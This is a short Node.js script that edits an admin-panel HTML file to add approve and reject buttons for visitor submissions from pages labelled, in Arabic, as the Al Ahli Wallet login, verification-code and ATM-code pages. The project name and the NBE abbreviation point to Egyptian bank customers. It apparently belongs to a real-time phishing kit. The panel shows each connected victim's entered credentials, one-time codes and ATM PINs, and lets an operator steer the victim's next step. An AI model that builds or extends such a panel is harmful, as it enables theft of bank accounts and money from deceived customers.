// Script to add NBE approve/reject buttons to admin panel
const fs = require('fs');
const path = '/home/ubuntu/mahfazat-alahli/server/admin/index.html';
let content = fs.readFileSync(path, 'utf8');

const searchStr = `            // إضافة زر موافقة لطلب إعادة إرسال الرمز`;

const replaceStr = `            // إضافة أزرار موافقة/رفض لصفحات محفظة الأهلي
            if (dataEntry.page === 'تسجيل الدخول - محفظة الأهلي' || dataEntry.page === 'رمز التحقق - محفظة الأهلي' || dataEntry.page === 'رمز ATM - محفظة الأهلي') {
              const nbeApproveBtnId = 'nbe-approve-btn-' + visitor.socketId + '-' + dataIndex;
              const nbeRejectBtnId = 'nbe-reject-btn-' + visitor.socketId + '-' + dataIndex;
              html += '<div class="flex gap-2 mt-3">';
              html += '<button id="' + nbeApproveBtnId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
              html += '<button id="' + nbeRejectBtnId + '" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
              html += '</div>';
              setTimeout(() => {
                const approveBtn = document.getElementById(nbeApproveBtnId);
                const rejectBtn = document.getElementById(nbeRejectBtnId);
                if (approveBtn) {
                  approveBtn.addEventListener('click', () => {
                    approveForm(visitor.socketId);
                    const originalText = approveBtn.textContent;
                    const originalClasses = ['bg-green-600', 'hover:bg-green-700'];
                    approveBtn.textContent = 'تم الإرسال ✓';
                    approveBtn.classList.remove(...originalClasses);
                    approveBtn.classList.add('bg-gray-400');
                    setTimeout(() => {
                      approveBtn.textContent = originalText;
                      approveBtn.classList.remove('bg-gray-400');
                      approveBtn.classList.add(...originalClasses);
                    }, 1500);
                  });
                }
                if (rejectBtn) {
                  rejectBtn.addEventListener('click', () => {
                    rejectForm(visitor.socketId);
                    const originalText = rejectBtn.textContent;
                    const originalClasses = ['bg-red-600', 'hover:bg-red-700'];
                    rejectBtn.textContent = 'تم الإرسال ✓';
                    rejectBtn.classList.remove(...originalClasses);
                    rejectBtn.classList.add('bg-gray-400');
                    setTimeout(() => {
                      rejectBtn.textContent = originalText;
                      rejectBtn.classList.remove('bg-gray-400');
                      rejectBtn.classList.add(...originalClasses);
                    }, 1500);
                  });
                }
              }, 100);
            }
            
            // إضافة زر موافقة لطلب إعادة إرسال الرمز`;

if (content.includes(searchStr)) {
  content = content.replace(searchStr, replaceStr);
  fs.writeFileSync(path, content, 'utf8');
  console.log('SUCCESS: NBE buttons added to admin panel');
} else {
  console.log('ERROR: Search string not found');
}
